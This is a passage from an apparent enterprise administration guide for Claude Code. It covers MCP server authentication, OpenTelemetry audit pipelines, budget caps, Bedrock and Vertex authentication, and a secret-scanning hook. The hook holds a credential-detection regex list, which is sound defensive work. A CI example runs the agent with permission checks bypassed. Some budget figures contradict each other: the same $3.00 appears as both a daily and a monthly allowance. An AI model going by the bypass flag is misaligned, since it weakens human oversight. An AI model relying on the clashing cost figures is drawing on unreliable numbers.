    claims = jwt.decode(
        token,
        key=key,
        algorithms=["RS256"],
        audience="mcp.internal.acme.com"
    )

    # Enforce that client is in approved list
    if claims["client_id"] not in APPROVED_CLIENT_IDS:
        raise PermissionError(f"Unapproved client: {claims['client_id']}")

    return claims
```

**mTLS (recommended for highest-security environments)**

```nginx
# nginx/mcp-server.conf
server {
    listen 443 ssl;
    server_name mcp.internal.acme.com;

    ssl_certificate     /etc/ssl/acme/server.pem;
    ssl_certificate_key /etc/ssl/acme/server-key.pem;

    # Require client certificate from internal CA
    ssl_client_certificate /etc/ssl/acme/internal-ca.pem;
    ssl_verify_client on;
    ssl_verify_depth 2;

    location / {
        # Pass verified client identity as header
        proxy_set_header X-Client-CN   $ssl_client_s_dn_cn;
        proxy_set_header X-Client-Cert $ssl_client_escaped_cert;
        proxy_pass http://claude-mcp-server:8080;
    }
}
```

### Tool Schema Governance

For enterprise MCP servers, establish governance for the tools you expose to Claude:

```json
{
  "name": "internal_db_query",
  "description": "Execute a read-only SQL query against the internal analytics database. Returns up to 1000 rows. Use for reporting and data analysis only. NEVER use for PII data (use the data-platform server for GDPR-controlled data).",
  "inputSchema": {
    "type": "object",
    "properties": {
      "query": {
        "type": "string",
        "description": "SQL SELECT statement. Must begin with SELECT. INSERT/UPDATE/DELETE/DROP are rejected.",
        "maxLength": 4096
      },
      "database": {
        "type": "string",
        "enum": ["analytics", "metrics", "reporting"],
        "description": "Target database. Only approved databases are accessible."
      }
    },
    "required": ["query", "database"]
  }
}
```

Tool description rules for enterprise:
- **Max 512 characters** in description (Claude truncates at ~600, keep shorter for reliable parsing)
- Include what the tool does NOT do (negative scoping reduces misuse)
- Version tools using a `X-Tool-Version` response header
- Deprecate tools with a `deprecated: true` flag and `deprecatedAt` date; remove after 90 days

---

## 6. Audit Logging with OpenTelemetry

### Why OpenTelemetry for Claude Code Audit Logging

OpenTelemetry is the enterprise audit logging mechanism for Claude Code rather than a proprietary log format, for several reasons:

1. **Vendor-neutral ingestion** — OTEL data flows directly into Datadog, Grafana/Tempo, Honeycomb, Jaeger, Azure Monitor, and any OTLP-compatible backend without format conversion. You own the data in your infrastructure from the moment it leaves the developer's machine.

2. **Trace context propagation** — Claude Code embeds W3C Trace Context headers (`traceparent`, `tracestate`) in the spans it emits. If a Claude-issued tool call triggers a downstream service (via MCP or Bash), and that service is also OTEL-instrumented, the trace IDs are correlated automatically. You can reconstruct the full causal chain: `User prompt → Claude turn → tool call → MCP server → internal API → database query` as a single unified trace.

3. **Span hierarchy reflects the agent's reasoning structure** — each Claude "turn" (one round of prompt → tool calls → response) becomes one OTEL trace. Child spans are the individual tool calls. This means a compliance auditor can look at a single trace and see exactly what Claude did in a single turn: what files it read, what commands it ran, what it wrote, what each tool returned, and the cost of the whole thing.

4. **Attribute-level filtering for compliance queries** — OTEL attributes like `tool.name`, `session.id`, `user.name`, and `cost.usd` are queryable as structured fields, not as text in a log line. A SOC 2 auditor asking "show me all sessions where a Bash command was run as root" translates directly to an OTEL attribute filter, not a regex over log files.

5. **No performance overhead on the hot path** — OTEL spans are emitted asynchronously by a background exporter thread. The developer's Claude Code session is not blocked waiting for telemetry acknowledgement. If the OTEL collector is unreachable, the exporter buffers spans in memory (configurable up to 2,048 spans) and retries with exponential backoff.

### OTEL Configuration

Claude Code emits OpenTelemetry traces for every tool call, session event, and API interaction. Configure the OTEL exporter via environment variables or managed settings:

```bash
# Environment variables (set via MDM or /etc/environment)
export OTEL_EXPORTER_OTLP_ENDPOINT="https://otel.internal.acme.com:4318"
export OTEL_EXPORTER_OTLP_PROTOCOL="http/protobuf"        # or "grpc"
export OTEL_EXPORTER_OTLP_HEADERS="x-api-key=<your-key>"
export OTEL_SERVICE_NAME="claude-code"
export OTEL_RESOURCE_ATTRIBUTES="deployment.environment=production,org.team=$(id -un)"
export OTEL_EXPORTER_OTLP_COMPRESSION="gzip"
```

Or in managed settings (pushed via MDM, cannot be overridden):

```json
{
  "otelEndpoint": "https://otel.internal.acme.com:4318",
  "otelProtocol": "http/protobuf",
  "otelHeaders": {
    "x-api-key": "${CORP_OTEL_API_KEY}"
  },
  "otelServiceName": "claude-code",
  "otelResourceAttributes": {
    "deployment.environment": "production",
    "org.name": "acme-corp",
    "org.region": "${AWS_REGION}"
  }
}
```

Note: `${ENV_VAR}` syntax in managed settings resolves from the developer's environment at startup time, allowing dynamic attributes without hardcoding them in the managed config.

### Events Emitted

Claude Code emits spans for the following event categories:

| Event Category | Span Names | Key Attributes |
|---------------|-----------|----------------|
| Session lifecycle | `session.start`, `session.end`, `session.compact` | `session.id`, `session.model`, `session.project_root` |
| Tool calls | `tool.call`, `tool.result` | `tool.name`, `tool.input_hash`, `tool.duration_ms`, `tool.exit_code` |
| Hook execution | `hook.pre_tool`, `hook.post_tool`, `hook.stop` | `hook.name`, `hook.blocked`, `hook.duration_ms` |
| API calls | `api.request`, `api.response` | `model.id`, `tokens.input`, `tokens.output`, `tokens.cache_read`, `cost.usd` |
| Permissions | `permission.check`, `permission.denied` | `tool.name`, `policy.source`, `deny.reason` |
| MCP calls | `mcp.call`, `mcp.result` | `mcp.server`, `mcp.tool`, `mcp.duration_ms` |

### Span Structure

Each Claude Code trace covers one agent turn (from user prompt to final response). The parent span is `claude.turn` with child spans for each tool call:

```
claude.turn  [traceId=abc123, spanId=000001]
  │  session.id = "sess_abcdefg"
  │  model.id = "claude-sonnet-4-6"
  │  tokens.input = 4521
  │  tokens.output = 892
  │  tokens.cache_read = 3104
  │  cost.usd = 0.0031
  │
  ├─ tool.call  [spanId=000002, parentSpanId=000001]
  │    tool.name = "Read"
  │    tool.input = "/home/user/project/src/main.py"
  │    tool.duration_ms = 12
  │    tool.exit_code = 0
  │
  ├─ tool.call  [spanId=000003, parentSpanId=000001]
  │    tool.name = "Bash"
  │    tool.input = "npm run test"
  │    tool.duration_ms = 8432
  │    tool.exit_code = 0
  │
  └─ hook.post_tool  [spanId=000004, parentSpanId=000003]
       hook.name = "post-bash-audit"
       hook.blocked = false
       hook.duration_ms = 45
```

### Understanding Trace Context Propagation

One of the most powerful — and underused — aspects of Claude Code's OTEL integration is W3C Trace Context propagation. When Claude Code calls a tool that makes an outbound HTTP request (e.g., an MCP server call), it injects the standard `traceparent` header into that request. Any downstream service that is also OTEL-instrumented picks up this header, continues the trace, and produces child spans that appear in the same trace tree in your observability backend.

This means you can reconstruct the complete causal chain of a Claude-initiated action:

```
Trace: abc123 (originated by claude.turn)
  │
  ├─ claude.turn [abc123/000001]
  │    user: "help me debug the slow query on the analytics endpoint"
  │    model: claude-sonnet-4-6
  │    cost.usd: 0.0089
  │
  ├─ mcp.call → corp-tools/internal_db_query [abc123/000002]
  │    mcp.server: corp-tools
  │    mcp.tool: internal_db_query
  │    database: analytics
  │    duration_ms: 2341
  │
  │     └─ (downstream, inside the MCP server — picked up via traceparent header)
  │        db.query [abc123/000003]   ← emitted by the MCP server's own OTEL
  │          db.system: postgresql
  │          db.statement: "SELECT * FROM events WHERE ..."
  │          db.duration_ms: 2290
  │          db.rows_returned: 1000
  │
  └─ tool.call → Bash("psql -c EXPLAIN ANALYZE ...") [abc123/000004]
       tool.name: Bash
       tool.duration_ms: 890
       tool.exit_code: 0
```

In Grafana Tempo or Jaeger, searching for trace ID `abc123` shows you the entire chain. A compliance auditor can look at a single trace ID and see exactly what query Claude ran, against which database, returning how many rows, and what cost was incurred — all with microsecond timestamps. This is not achievable with log-based auditing.

**To enable downstream trace propagation in your MCP server:**

```python
# mcp_server/middleware.py — propagate trace context from Claude Code
from opentelemetry import trace
from opentelemetry.propagate import extract

def get_tracer_from_request(request_headers: dict):
    """Extract the traceparent/tracestate from the incoming MCP request headers."""
    # Claude Code injects W3C trace context into HTTP MCP calls
    context = extract(request_headers)
    tracer = trace.get_tracer("mcp-corp-tools")
    return tracer, context

# Usage in your MCP tool handler:
async def handle_tool_call(tool_name: str, params: dict, headers: dict):
    tracer, ctx = get_tracer_from_request(headers)
    with tracer.start_as_current_span(f"mcp.tool.{tool_name}", context=ctx) as span:
        span.set_attribute("mcp.tool", tool_name)
        span.set_attribute("mcp.server", "corp-tools")
        # ... execute the tool
```

### OTEL Collector Pipeline Architecture

For enterprise deployments with many developers, sending OTEL data directly from each developer's machine to a cloud backend creates a large number of connections and bypasses your network policy. The recommended pattern is a **two-tier collector** setup:

```
Developer machine
  Claude Code → [OTEL SDK] → localhost:4317 (local collector agent)

Local collector agent (runs as system daemon on each machine)
  - Receives spans from Claude Code
  - Adds resource attributes (hostname, OS, user, team from LDAP)
  - Buffers up to 10,000 spans in memory
  - Batches and retries delivery with exponential backoff
  - Forwards to → central collector cluster

Central collector cluster (shared infrastructure, 2-3 replicas)
  - Receives from all developer machines
  - Applies sampling rules (keep 100% of traces with errors, 10% of routine traces)
  - Routes to multiple backends: Tempo (traces) + Prometheus (metrics) + S3 (archive)
  - Enforces data retention (30 days hot, 1 year cold in S3)
```

**Local collector agent config (`/etc/otelcol/config.yaml` on each developer machine):**

```yaml
receivers:
  otlp:
    protocols:
      grpc:
        endpoint: localhost:4317
      http:
        endpoint: localhost:4318

processors:
  # Add machine-level resource attributes
  resource:
    attributes:
    - key: host.name
      from_attribute: host.name
      action: upsert
    - key: user.name
      value: "${env:USER}"
      action: insert
    - key: org.team
      value: "${env:LDAP_TEAM}"    # set by login script
      action: insert

  # Batch to reduce connection overhead to central collector
  batch:
    timeout: 5s
    send_batch_size: 1024

  # Memory limiter — prevent OOM if central collector is slow
  memory_limiter:
    check_interval: 1s
    limit_mib: 256

exporters:
  otlp/central:
    endpoint: https://otel-collector.internal.acme.com:4317
    headers:
      x-auth-token: "${env:CORP_OTEL_TOKEN}"
    retry_on_failure:
      enabled: true
      initial_interval: 5s
      max_interval: 60s
      max_elapsed_time: 300s

service:
  pipelines:
    traces:
      receivers: [otlp]
      processors: [memory_limiter, resource, batch]
      exporters: [otlp/central]
```

**Central collector config (routes to multiple backends):**

```yaml
# otel-collector-central.yaml
receivers:
  otlp:
    protocols:
      grpc:
        endpoint: 0.0.0.0:4317

processors:
  # Tail-based sampling: keep all error traces, sample 10% of normal traces
  tail_sampling:
    decision_wait: 10s
    policies:
    - name: errors-policy
      type: status_code
      status_code: {status_codes: [ERROR]}
    - name: high-cost-policy
      type: numeric_attribute
      numeric_attribute: {key: cost.usd, min_value: 0.10}   # keep all high-cost sessions
    - name: sample-rest
      type: probabilistic
      probabilistic: {sampling_percentage: 10}

  # Derive metrics from spans for Prometheus
  spanmetrics:
    metrics_exporter: prometheus
    dimensions:
    - name: user.name
    - name: org.team
    - name: model.id

exporters:
  # Live trace storage (30-day retention)
  otlp/tempo:
    endpoint: https://tempo.internal.acme.com:4317
  # Metrics for Grafana dashboards
  prometheus:
    endpoint: 0.0.0.0:8889
    namespace: claude_code
  # Long-term archive in S3 (compliance retention, 1 year)
  awss3:
    s3uploader:
      region: us-east-1
      s3_bucket: acme-otel-archive
      s3_prefix: claude-code/
      file_prefix: traces

service:
  pipelines:
    traces:
      receivers: [otlp]
      processors: [tail_sampling, spanmetrics]
      exporters: [otlp/tempo, awss3]
    metrics:
      exporters: [prometheus]
```

This two-tier setup gives you: local buffering (developers still have audit data even if central collector is briefly down), cross-team aggregation with LDAP-sourced team attributes, cost-efficient sampling (keep everything interesting, archive the rest), and a compliance-ready S3 archive for the 1-year retention that SOC 2 and ISO 27001 typically require.

### Connecting to Observability Backends

**Datadog:**

```bash
# Use the Datadog OTEL agent as a local collector
export OTEL_EXPORTER_OTLP_ENDPOINT="http://localhost:4318"
# Datadog agent config (datadog.yaml):
# otlp_config:
#   receiver:
#     protocols:
#       http:
#         endpoint: 0.0.0.0:4318
```

**Grafana / Tempo:**

```bash
export OTEL_EXPORTER_OTLP_ENDPOINT="https://tempo.internal.acme.com:4318"
export OTEL_EXPORTER_OTLP_HEADERS="Authorization=Bearer ${GRAFANA_TOKEN}"
```

**Honeycomb:**

```bash
export OTEL_EXPORTER_OTLP_ENDPOINT="https://api.honeycomb.io"
export OTEL_EXPORTER_OTLP_HEADERS="x-honeycomb-team=${HONEYCOMB_API_KEY}"
export OTEL_SERVICE_NAME="claude-code"
```

**Azure Monitor (Application Insights):**

```bash
# Use the Azure Monitor OTEL exporter
export OTEL_EXPORTER_OTLP_ENDPOINT="https://<region>.dc.applicationinsights.azure.com/v2/track"
export OTEL_EXPORTER_OTLP_HEADERS="x-functions-key=${APPINSIGHTS_INSTRUMENTATION_KEY}"
```

### Cost Dashboard from OTEL Data

With OTEL traces flowing, build cost dashboards by querying the `cost.usd` and `tokens.*` attributes.

**Prometheus metric derivation (via OTEL Collector processor):**

```yaml
# otel-collector-config.yaml
processors:
  transform/claude_metrics:
    metric_statements:
    - context: datapoint
      statements:
      - set(attributes["developer"], resource.attributes["user.name"])
      - set(attributes["team"], resource.attributes["org.team"])
      - set(attributes["model"], attributes["model.id"])

exporters:
  prometheus:
    endpoint: "0.0.0.0:8889"
    namespace: claude_code

service:
  pipelines:
    metrics:
      processors: [transform/claude_metrics]
      exporters: [prometheus]
```

**Example Grafana queries:**

```promql
# Total cost per developer (last 7 days)
sum by (developer) (
  increase(claude_code_cost_usd_total[7d])
)

# Cost per model tier
sum by (model) (
  rate(claude_code_cost_usd_total[1h])
) * 3600

# Cache hit rate (lower cost = higher cache hit)
sum(rate(claude_code_tokens_cache_read_total[1h]))
/
sum(rate(claude_code_tokens_input_total[1h]))

# Tool usage heatmap (which tools fire most)
topk(20,
  sum by (tool_name) (
    increase(claude_code_tool_calls_total[24h])
  )
)
```

**Cost per developer dashboard panels:**
- Daily spend per developer (bar chart, sorted descending)
- Cost trend over 30 days (line chart, coloured by model)
- Cache hit rate by project (higher = more efficient CLAUDE.md)
- Tool call frequency heatmap (time-of-day × tool type)
- Budget utilisation gauge (actual vs. allocated per team)

---

## 7. Cost Governance & Budget Caps

### Budget Cap Environment Variables

Claude Code supports two types of budget caps:

```bash
# Hard token cap — session aborts when this many input+output tokens are consumed
export ANTHROPIC_BUDGET_TOKEN_CAP=500000

# Hard dollar cap — session aborts when this USD amount is spent
export ANTHROPIC_BUDGET_USD_CAP=5.00
```

The session is terminated with a `budget_exceeded` error when either cap is hit. These can also be set per-session via CLI:

```bash
claude --max-budget-usd 2.50 --print "Refactor the auth module"
```

Or in settings (per-project or per-user):

```json
{
  "maxBudgetUsd": 5.00,
  "maxBudgetTokenCap": 500000
}
```

In managed settings, these become hard ceilings. Users cannot set budgets above the managed maximum; they can only set lower limits.

### Per-Project, Per-User, Per-Team Allocation

Implement cost allocation by combining OTEL attributes with budget caps:

```bash
# Project-level budget: committed in .claude/settings.json in the repo
# .claude/settings.json
{
  "maxBudgetUsd": 2.00
}

# Team-level budget: set via onboarding script in ~/.claude/settings.json
# Derived from team's monthly allocation divided by working days
DAILY_BUDGET=$(echo "scale=2; ${TEAM_MONTHLY_BUDGET} / 22" | bc)
claude config set maxBudgetUsd "$DAILY_BUDGET"
```

**Budget allocation by team type (example policy):**

| Team Type | Daily Budget | Max Model | Max Effort |
|-----------|-------------|-----------|-----------|
| Junior engineers | $3.00 | Sonnet 4.6 | normal |
| Senior engineers | $8.00 | Opus 4.6 | high |
| Staff / Principal | $20.00 | Opus 4.7 | xhigh |
| Platform / Infra | $15.00 | Opus 4.6 | high |
| CI/CD automation | $1.00 per run | Haiku 4.5 | low |

### Model Tier Policy Enforcement

Force model selection based on role via managed settings with team-specific configurations:

```bash
# deploy-team-policy.sh — called during machine provisioning
LDAP_GROUPS=$(ldapsearch -x -LLL -b "dc=acme,dc=com" \
  "(uid=${USER})" memberOf | grep -o 'cn=[^,]*' | cut -d= -f2)

if echo "$LDAP_GROUPS" | grep -q "staff-engineers"; then
  POLICY_FILE="/opt/acme/claude-policies/staff-engineers.json"
elif echo "$LDAP_GROUPS" | grep -q "senior-engineers"; then
  POLICY_FILE="/opt/acme/claude-policies/senior-engineers.json"
else
  POLICY_FILE="/opt/acme/claude-policies/standard.json"
fi

cp "$POLICY_FILE" /etc/claude-code/managed-settings.json
```

```json
// /opt/acme/claude-policies/standard.json
{
  "model": "claude-sonnet-4-6",
  "maxEffortLevel": "normal",
  "maxBudgetUsd": 3.00,
  "allowedModels": ["claude-sonnet-4-6", "claude-haiku-4-5"],
  "disableTelemetryOverride": true
}

// /opt/acme/claude-policies/staff-engineers.json
{
  "maxEffortLevel": "xhigh",
  "maxBudgetUsd": 20.00,
  "allowedModels": [
    "claude-opus-4-7",
    "claude-opus-4-6",
    "claude-sonnet-4-6",
    "claude-haiku-4-5"
  ],
  "disableTelemetryOverride": true
}
```

### Cost Projection Formula and Budget Sizing

Before deploying to 500+ developers, FinOps teams need a defensible cost model. Use this formula to project monthly spend:

```
Monthly Cost = Developers × Daily Sessions × Turns per Session
             × ((Input Tokens × Input Rate) + (Output Tokens × Output Rate)
             + (Cache Read Tokens × Cache Rate))
             × Working Days per Month
```

**Baseline empirical values** (from platform team pilot data, typical software development tasks):

| Variable | Conservative | Typical | Heavy |
|----------|-------------|---------|-------|
| Daily sessions per developer | 2 | 4 | 8 |
| Turns per session | 6 | 12 | 25 |
| Input tokens per turn | 3,500 | 6,000 | 12,000 |
| Output tokens per turn | 400 | 800 | 1,500 |
| Cache read tokens per turn | 500 | 2,500 | 8,000 |

**Sonnet 4.6 rates** (as of May 2026, via direct API — Bedrock/Vertex may differ slightly):
- Input: $3.00 / 1M tokens
- Output: $15.00 / 1M tokens
- Cache read: $0.30 / 1M tokens
- Cache write: $3.75 / 1M tokens (first-time writes, billed like input)

**Example: 500-developer org, typical usage, Sonnet 4.6:**

```
Per session cost:
  Input:       6,000 tokens × $3.00/1M    = $0.018
  Output:        800 tokens × $15.00/1M   = $0.012
  Cache read:  2,500 tokens × $0.30/1M    = $0.00075
  ─────────────────────────────────────────────────
  Per session:                              $0.03075

Per developer per day:
  4 sessions × $0.03075 = $0.123/day

Per developer per month (22 working days):
  $0.123 × 22 = $2.71/month

Org total (500 developers):
  500 × $2.71 = $1,355/month
```

**Sensitivity analysis — the model tier lever is the biggest variable:**

| Model | Input Rate | Output Rate | Per-dev/month (typical) | 500-dev org/month |
|-------|-----------|------------|------------------------|-------------------|
| Haiku 4.5 | $0.25/M | $1.25/M | $0.24 | $120 |
| Sonnet 4.6 | $3.00/M | $15.00/M | $2.71 | $1,355 |
| Opus 4.6 | $15.00/M | $75.00/M | $13.55 | $6,775 |

**Practical implication:** Moving 200 of your 500 developers from Sonnet to Haiku for routine work (code formatting, simple refactors, doc generation) while keeping Sonnet for complex tasks reduces org cost by ~35–40% without reducing capability for complex tasks.

**Budget cap formula — setting `maxBudgetUsd` per developer tier:**

```python
# budget_calculator.py — run during onboarding to compute the right cap
def daily_budget_cap(role: str, monthly_allocation: float, buffer_factor: float = 1.3) -> float:
    """
    monthly_allocation: the FinOps-approved monthly budget for this role in USD
    buffer_factor: multiplier to account for occasional high-usage days (default 1.3 = 30% headroom)
    Returns: daily cap to set in managed settings
    """
    working_days = 22  # standard; adjust for your org's calendar
    daily_average = monthly_allocation / working_days
    # Cap at 1.3× the daily average — allows surge usage without hitting the cap on typical days
    return round(daily_average * buffer_factor, 2)

# Example output for standard policy:
# Junior engineers:   $3.00/month ÷ 22 × 1.3 = $0.18/day  (cap blocks overuse, not normal use)
# Senior engineers:   $8.00/month ÷ 22 × 1.3 = $0.47/day
# Staff engineers:   $20.00/month ÷ 22 × 1.3 = $1.18/day
```

Note: these "per session" caps are separate from the API-level monthly billing — they're a guardrail that terminates individual runaway sessions. They do NOT automatically enforce a monthly total. For monthly totals, use your cloud provider's billing alerts (AWS Cost Anomaly Detection for Bedrock, GCP Budget Alerts for Vertex) alongside these per-session caps.

### Prompt Caching Strategy for Org-Wide Cost Reduction

Prompt caching is automatic in Claude Code and is the single highest-impact cost optimisation available. Cache read tokens cost 10–20× less than input tokens (Sonnet: $0.30 vs. $3.00/M).

Cache hit rates are determined by how stable the prompt prefix is across requests. The prefix includes:

1. System prompt
2. CLAUDE.md content
3. Rules content loaded at session start
4. Previous conversation turns (if resumed)

**Maximise cache hit rates:**

```markdown
<!-- CLAUDE.md — cache-optimising structure -->
<!-- ✓ DO: Put stable content first, variable content last -->

# Project: Payment Service
# Stack: TypeScript, Node.js 20, PostgreSQL 15

## Architecture
[stable — doesn't change between sessions]

## Conventions
[stable — team-agreed conventions]

## Current Sprint Context  ← put this LAST
[variable — changes weekly]
```

```json
// Settings to maximise cache efficiency
{
  "contextWindowUtilisation": 0.8,   // leave 20% for output
  "cacheWarmup": true,               // warm cache at session start
  "resumeLastSession": true          // reuse conversation history
}
```

**Warm-up pattern for CI/CD:**

```bash
# Warm the cache before expensive CI tasks by loading CLAUDE.md first
# This primes the cache so the actual task hits cache on its first token
claude --print "Acknowledge that you have loaded the project context" \
       --permission-mode plan \
       --max-turns 1 \
       --bare \
  && claude --print "$ACTUAL_TASK" \
            --permission-mode bypassPermissions \
            --max-turns 30
```

Cache entries live for 5 minutes of inactivity. For long-running CI pipelines, keep-alive pings aren't necessary — the cache is maintained as long as the session is active.

**Expected cache hit rates by scenario:**

| Scenario | Expected Cache Hit Rate | Notes |
|---------|------------------------|-------|
| Resumed interactive session | 70–90% | Most of context already cached |
| Fresh session, stable CLAUDE.md | 40–60% | CLAUDE.md tokens cached |
| Headless CI, same repo | 50–70% | CLAUDE.md + codebase context |
| Fresh session, no CLAUDE.md | 5–15% | No stable prefix |

Improving org-wide cache hit rate from 20% to 60% on 500 developers × $5/day = **~$400/day cost reduction**.

---

## 8. Multi-Cloud Authentication

### AWS Bedrock

AWS Bedrock routes Claude API calls through your AWS account, keeping data within your AWS infrastructure and enabling IAM-based access control.

**Prerequisites:**
- AWS account with Bedrock access enabled in your region
- Claude model access requested and approved in the Bedrock console
- IAM role with `bedrock:InvokeModel` permission

**Configuration:**

```bash
export CLAUDE_CODE_USE_BEDROCK=1
export AWS_REGION=us-east-1                    # region where Bedrock is enabled
# Credentials via standard AWS credential chain:
# 1. AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY (not recommended for production)
# 2. IAM instance profile (recommended for EC2/ECS)
# 3. IRSA (recommended for Kubernetes)
# 4. AWS SSO / IAM Identity Center
```

**IAM policy for Claude Code Bedrock access:**

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "ClaudeCodeBedrockAccess",
      "Effect": "Allow",
      "Action": [
        "bedrock:InvokeModel",
        "bedrock:InvokeModelWithResponseStream"
      ],
      "Resource": [
        "arn:aws:bedrock:us-east-1::foundation-model/anthropic.claude-sonnet-4-6*",
        "arn:aws:bedrock:us-east-1::foundation-model/anthropic.claude-haiku-4-5*"
      ]
    }
  ]
}
```

For staff engineers who need Opus access, add Opus model ARNs to the resource list. Use IAM groups to enforce model-tier policy at the cloud layer.

**Bedrock Service Tiers:**

| Tier | Throughput | Latency | Use Case |
|------|-----------|---------|---------|
| `default` | Shared pool | Variable | Development, light use |
| `flex` (Provisioned Throughput) | Reserved capacity | Consistent | Teams > 20 concurrent users |
| `priority` (On-Demand + priority queue) | High | Low | Mission-critical automation |

Configure throughput tier in managed settings:

```json
{
  "bedrockThroughputTier": "flex",
  "bedrockProvisionedArn": "arn:aws:bedrock:us-east-1:123456789:provisioned-model/abc123"
}
```

**Cross-account access (for centralised Bedrock account):**

```json
// Trust policy on the Bedrock account's IAM role
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {
      "AWS": "arn:aws:iam::DEVELOPER-ACCOUNT-ID:root"
    },
    "Action": "sts:AssumeRole",
    "Condition": {
      "StringEquals": {
        "aws:PrincipalTag/Department": "Engineering"
      }
    }
  }]
}
```

### GCP Vertex AI

Vertex AI routes API calls through your GCP project. The recommended auth pattern is **Workload Identity Federation** — no service account keys, no key rotation, no key leakage risk.

**Configuration:**

```bash
export CLAUDE_CODE_USE_VERTEX=1
export CLOUD_ML_REGION=us-east5         # region where Claude is enabled on Vertex
export ANTHROPIC_VERTEX_PROJECT_ID=acme-ai-prod

# For developer machines: use Application Default Credentials
gcloud auth application-default login

# For CI/CD: use Workload Identity Federation (see below)
```

**Workload Identity Federation setup (for GitHub Actions):**

```bash
# 1. Create WIF pool
gcloud iam workload-identity-pools create "github-actions" \
  --project="${PROJECT_ID}" \
  --location="global" \
  --display-name="GitHub Actions"

# 2. Create provider
gcloud iam workload-identity-pools providers create-oidc "github-provider" \
  --project="${PROJECT_ID}" \
  --location="global" \
  --workload-identity-pool="github-actions" \
  --display-name="GitHub" \
  --attribute-mapping="google.subject=assertion.sub,attribute.repository=assertion.repository" \
  --issuer-uri="https://token.actions.githubusercontent.com"

# 3. Bind service account to WIF
gcloud iam service-accounts add-iam-policy-binding \
  "claude-code-ci@${PROJECT_ID}.iam.gserviceaccount.com" \
  --project="${PROJECT_ID}" \
  --role="roles/iam.workloadIdentityUser" \
  --member="principalSet://iam.googleapis.com/projects/${PROJECT_NUMBER}/locations/global/workloadIdentityPools/github-actions/attribute.repository/acme-corp/your-repo"
```

**GitHub Actions workflow using WIF:**

```yaml
# .github/workflows/claude-ci.yml
jobs:
  claude-review:
    permissions:
      id-token: write     # Required for WIF
      contents: read

    steps:
    - uses: google-github-actions/auth@v2
      with:
        workload_identity_provider: "projects/123456789/locations/global/workloadIdentityPools/github-actions/providers/github-provider"
        service_account: "claude-code-ci@acme-ai-prod.iam.gserviceaccount.com"

    - name: Run Claude Code
      env:
        CLAUDE_CODE_USE_VERTEX: "1"
        CLOUD_ML_REGION: "us-east5"
        ANTHROPIC_VERTEX_PROJECT_ID: "acme-ai-prod"
      run: |
        claude --print "Review this PR for security issues" \
               --permission-mode plan \
               --output-format json
```

**Vertex AI IAM roles:**

```bash
# Grant the Claude Code service account access to Claude models on Vertex
gcloud projects add-iam-policy-binding "${PROJECT_ID}" \
  --member="serviceAccount:claude-code-ci@${PROJECT_ID}.iam.gserviceaccount.com" \
  --role="roles/aiplatform.user"
```

### Routing Between Bedrock and Vertex

Some organisations use both providers — e.g., AWS teams use Bedrock, GCP teams use Vertex. Configure routing via team-specific managed settings profiles:

```json
// /opt/acme/claude-policies/aws-team.json
{
  "cloudProvider": "bedrock",
  "awsRegion": "us-east-1",
  "bedrockThroughputTier": "flex"
}

// /opt/acme/claude-policies/gcp-team.json
{
  "cloudProvider": "vertex",
  "vertexRegion": "us-east5",
  "vertexProjectId": "acme-ai-prod"
}
```

**Failover pattern** — fall back to direct API if both cloud providers are unavailable:

```bash
# wrapper-claude.sh — used in CI/CD
set -euo pipefail

if aws bedrock list-foundation-models --region us-east-1 &>/dev/null; then
  export CLAUDE_CODE_USE_BEDROCK=1
  export AWS_REGION=us-east-1
elif gcloud ai models list --region=us-east5 &>/dev/null; then
  export CLAUDE_CODE_USE_VERTEX=1
  export CLOUD_ML_REGION=us-east5
  export ANTHROPIC_VERTEX_PROJECT_ID="${GCP_PROJECT}"
else
  # Fallback to direct API (requires ANTHROPIC_API_KEY)
  echo "WARNING: Cloud providers unavailable, using direct API"
fi

exec claude "$@"
```

---

## 9. Enterprise Hooks for Compliance

### Compliance Hook Architecture

Enterprise compliance requirements typically mandate:
- Evidence that no secrets were committed
- Audit trail of all shell commands executed by AI
- Session summaries linked to ticketing systems
- PII not sent to external APIs
- All events forwarded to SIEM

Hooks address all of these. Place hooks in the enterprise plugin's `hooks/` directory — they are automatically installed for every developer when the plugin is installed.

### PreFileWrite: Secret Detection

Block file writes that contain secrets:

```bash
#!/usr/bin/env bash
# hooks/pre-file-write-secrets.sh
# Blocks any file write containing patterns matching secrets

set -euo pipefail

# Read the file path from stdin (JSON from Claude Code)
PAYLOAD=$(cat)
FILE_PATH=$(echo "$PAYLOAD" | jq -r '.tool_input.file_path // .tool_input.path // ""')
CONTENT=$(echo "$PAYLOAD" | jq -r '.tool_input.content // ""')

# Write content to temp file for scanning
TMPFILE=$(mktemp)
echo "$CONTENT" > "$TMPFILE"
trap 'rm -f "$TMPFILE"' EXIT

# Run gitleaks or trufflehog for secret scanning
if command -v gitleaks &>/dev/null; then
  if gitleaks detect --source="$TMPFILE" --no-git --quiet 2>/dev/null; then
    :  # No secrets found
  else
    echo "SECRET DETECTED: Potential secret found in $FILE_PATH — write blocked." >&2
    echo "Run 'gitleaks detect --source=$TMPFILE' locally to see details." >&2
    exit 2  # Exit code 2 blocks the write
  fi
fi

# Additional pattern checks
PATTERNS=(
  'AKIA[0-9A-Z]{16}'                        # AWS Access Key
  'sk-[a-zA-Z0-9]{48}'                       # OpenAI API key
  'xoxb-[0-9]+-[a-zA-Z0-9]+'               # Slack bot token
  'ghp_[a-zA-Z0-9]{36}'                     # GitHub personal token
  'ANTHROPIC_API_KEY\s*=\s*sk-ant-'         # Anthropic API key
  'password\s*=\s*["\x27][^\s]{8,}'         # Hardcoded password
  'BEGIN (RSA|DSA|EC|OPENSSH) PRIVATE KEY'  # Private keys
)

for PATTERN in "${PATTERNS[@]}"; do
  if echo "$CONTENT" | grep -qE "$PATTERN"; then
    echo "BLOCKED: Pattern '$PATTERN' matched in $FILE_PATH" >&2
    echo "This write was blocked to prevent credential exposure." >&2
    exit 2
  fi
done

exit 0
```

Register in `~/.claude/settings.json` or via managed settings:

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Write|Edit|MultiEdit",
        "hooks": [{
          "type": "command",
          "command": "/opt/acme/hooks/pre-file-write-secrets.sh",
          "timeout": 10000
        }]
      }
    ]
  }
}
```

### PostBash: Command Audit Logging

Log every shell command Claude executes to a centralised audit system:

```bash
#!/usr/bin/env bash
# hooks/post-bash-audit.sh
# Logs all Bash tool executions to audit log

set -euo pipefail

PAYLOAD=$(cat)
COMMAND=$(echo "$PAYLOAD" | jq -r '.tool_input.command // ""')
